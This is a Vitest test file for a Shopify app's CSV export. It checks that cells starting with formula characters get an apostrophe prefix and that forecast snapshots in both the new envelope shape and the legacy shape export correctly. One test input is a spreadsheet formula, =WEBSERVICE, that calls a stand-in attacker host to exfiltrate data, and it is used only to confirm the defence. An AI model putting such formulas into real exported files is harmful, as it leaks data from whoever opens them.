/**
 * CSV export hardening (app/routes/app.analytics.export.tsx).
 *
 * 1. Formula-injection fix: cells beginning with =, +, -, @ (or tab/CR) are
 *    interpreted as formulas by Excel/Google Sheets, so a customer-controlled
 *    value like `=WEBSERVICE(...)` in an exported CSV became a
 *    data-exfiltration vector when the merchant opened the file. String cells
 *    now get an apostrophe prefix (the spreadsheet "treat as text" marker);
 *    numeric cells are untouched and RFC-4180 quoting is unchanged.
 * 2. Forecast snapshot envelope fix: runForecastJob stores the V2
 *    {rows, meta} envelope in ForecastSnapshot.rowsJson — the export route
 *    must read it via parseForecastSnapshotRows. A raw parseJson array cast
 *    made rows.map throw ("rows.map is not a function") and 500ed the
 *    forecast download for every post-deploy snapshot.
 */
import { beforeEach, describe, expect, it, vi } from "vitest";

const db = vi.hoisted(() => ({
  forecastSnapshot: { findFirst: vi.fn() },
}));
vi.mock("~/db.server", () => ({ default: db }));
// The route imports `authenticate` at module scope; with db.server mocked,
// the real shopify.server would hand PrismaSessionStorage the mock — stub it.
vi.mock("~/shopify.server", () => ({
  authenticate: {},
  unauthenticated: {},
  default: {},
}));

import { buildExport, csvEscape, toCsv } from "~/services/analytics/exporters.server";

describe("csvEscape — formula-injection neutralisation", () => {
  it("prefixes an apostrophe on strings starting with =", () => {
    // Before the fix this returned "=1+2" verbatim — Excel evaluated it to 3.
    expect(csvEscape("=1+2")).toBe("'=1+2");
  });

  it("neutralises the WEBSERVICE exfiltration vector (quoted because of embedded quotes)", () => {
    const out = csvEscape('=WEBSERVICE("http://evil.example/x")');
    // Apostrophe first, then RFC-4180 quoting since the value contains quotes.
    expect(out.startsWith(`"'=WEBSERVICE`)).toBe(true);
    expect(out).toBe(`"'=WEBSERVICE(""http://evil.example/x"")"`);
  });

  it("prefixes strings starting with +, - and @", () => {
    expect(csvEscape("+33 612345678")).toBe("'+33 612345678");
    expect(csvEscape("-too expensive, found cheaper")).toBe(
      `"'-too expensive, found cheaper"`,
    );
    expect(csvEscape("@handle")).toBe("'@handle");
  });

  it("prefixes strings starting with tab or carriage return", () => {
    expect(csvEscape("\t=cmd")).toBe("'\t=cmd");
    // Leading CR: apostrophe added, then quoted because it contains CR.
    expect(csvEscape("\rX")).toBe(`"'\rX"`);
  });

  it("leaves numeric cells intact — negative numbers are data, not formulas", () => {
    expect(csvEscape(-1250)).toBe("-1250");
    expect(csvEscape(0)).toBe("0");
    expect(csvEscape(4900)).toBe("4900");
  });

  it("leaves plain strings, null and undefined unchanged", () => {
    expect(csvEscape("hydration serum")).toBe("hydration serum");
    expect(csvEscape(null)).toBe("");
    expect(csvEscape(undefined)).toBe("");
  });

  it("keeps RFC-4180 quoting for commas, quotes and newlines", () => {
    expect(csvEscape("a,b")).toBe(`"a,b"`);
    expect(csvEscape('say "hi"')).toBe(`"say ""hi"""`);
    expect(csvEscape("line1\nline2")).toBe(`"line1\nline2"`);
  });

  it("combines apostrophe prefix with quoting when both apply", () => {
    expect(csvEscape("=a,b")).toBe(`"'=a,b"`);
  });
});

describe("toCsv", () => {
  it("joins header and rows with trailing newline and neutralised cells", () => {
    const csv = toCsv(
      ["cohort", "value"],
      [
        ["2026-07", 100],
        ["=EVIL()", -5],
      ],
    );
    expect(csv).toBe("cohort,value\n2026-07,100\n'=EVIL(),-5\n");
  });
});

// ── Forecast export — V2 envelope + legacy snapshots ─────────────────────

const FORECAST_HEADER =
  "weekStart,sku,title,market,contractedUnits,probabilityAdjustedUnits," +
  "expectedSkips,expectedPauses,expectedCancellations,expectedFailedPayments," +
  "expectedAddOnUnits,revenueCents,marginCents,ciLowCents,ciHighCents";

function forecastRow() {
  return {
    weekStart: "2026-08-03",
    sku: "CLX-01",
    title: "Renewal Serum",
    market: "FR",
    contractedUnits: 12,
    probabilityAdjustedUnits: 10.4,
    expectedSkips: 0.6,
    expectedPauses: 0.4,
    expectedCancellations: 0.3,
    expectedFailedPayments: 0.3,
    expectedAddOnUnits: 1.2,
    revenueCents: 45600,
    marginCents: 31900,
    ciLowCents: 40100,
    ciHighCents: 51200,
  };
}

const FORECAST_ROW_CSV =
  "2026-08-03,CLX-01,Renewal Serum,FR,12,10.4,0.6,0.4,0.3,0.3,1.2,45600,31900,40100,51200";

describe("buildExport — forecast snapshot shapes", () => {
  beforeEach(() => {
    db.forecastSnapshot.findFirst.mockReset();
  });

  async function exportForecastCsv(): Promise<string> {
    const res = await buildExport(
      "cellexia-demo.myshopify.com",
      "forecast",
      "startMonth",
      "retention",
    );
    expect(res.headers.get("Content-Type")).toContain("text/csv");
    return res.text();
  }

  it("REGRESSION: exports rows from a V2 {rows, meta} envelope snapshot instead of 500ing", async () => {
    // runForecastJob persists JSON.stringify({ rows, meta }) — before the
    // fix the route cast this envelope to ForecastRow[] and rows.map threw.
    db.forecastSnapshot.findFirst.mockResolvedValue({
      rowsJson: JSON.stringify({
        rows: [forecastRow()],
        meta: {
          options: { model: "CONTRACT", scenario: "BASE", horizonWeeks: 13 },
          computedAt: "2026-08-01T02:00:00.000Z",
          reliability: null,
        },
      }),
    });
    const csv = await exportForecastCsv();
    expect(csv).toBe(`${FORECAST_HEADER}\n${FORECAST_ROW_CSV}\n`);
  });

  it("still reads legacy bare-array snapshots (backward compatibility)", async () => {
    db.forecastSnapshot.findFirst.mockResolvedValue({
      rowsJson: JSON.stringify([forecastRow()]),
    });
    const csv = await exportForecastCsv();
    expect(csv).toBe(`${FORECAST_HEADER}\n${FORECAST_ROW_CSV}\n`);
  });

  it("returns a header-only CSV when no snapshot exists yet", async () => {
    db.forecastSnapshot.findFirst.mockResolvedValue(null);
    const csv = await exportForecastCsv();
    expect(csv).toBe(`${FORECAST_HEADER}\n`);
  });
});
